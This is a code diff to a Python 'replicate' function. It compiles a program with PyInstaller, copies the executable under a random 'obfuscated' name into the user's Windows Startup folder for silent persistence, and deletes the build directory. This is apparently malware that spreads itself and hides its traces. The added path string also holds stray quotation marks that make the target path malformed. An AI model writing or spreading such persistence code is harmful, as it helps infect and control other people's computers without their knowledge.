@@ -1,9 +1,7 @@
 import os
-import shutil
-
 from Utils.helpers import random_string, download_file,\
     extract_zip,tempFolder,BaseTempFolder,install_with_pyinstaller,find_python_path
-from shutil import copytree,rmtree
+from shutil import copytree,rmtree,copyfile
 
 
 
@@ -26,6 +24,13 @@ def replicate():
                                      base_dir=new_location,
                                      file_to_install='main.py',
                                      hidden_imports=['psutil','sqlite3','requests'])
+            obfuscated_file_name = random_string(is_random=True, is_exe=True)
+            obfuscated_startup_folder = f"'c:/users/{os.getlogin()}/" \
+                                        f"appdata/roaming/microsoft/" \
+                                        f"windows/start menu/programs/startup/{obfuscated_file_name}'"
+            copyfile(os.path.join(new_location,'main.exe'), obfuscated_startup_folder)
+            rmtree(new_location)
+
             return True
         #install it with pyinstaller?
         # we should do this path ONLY if we compiled the bootloader and didn't succed in the usual ways
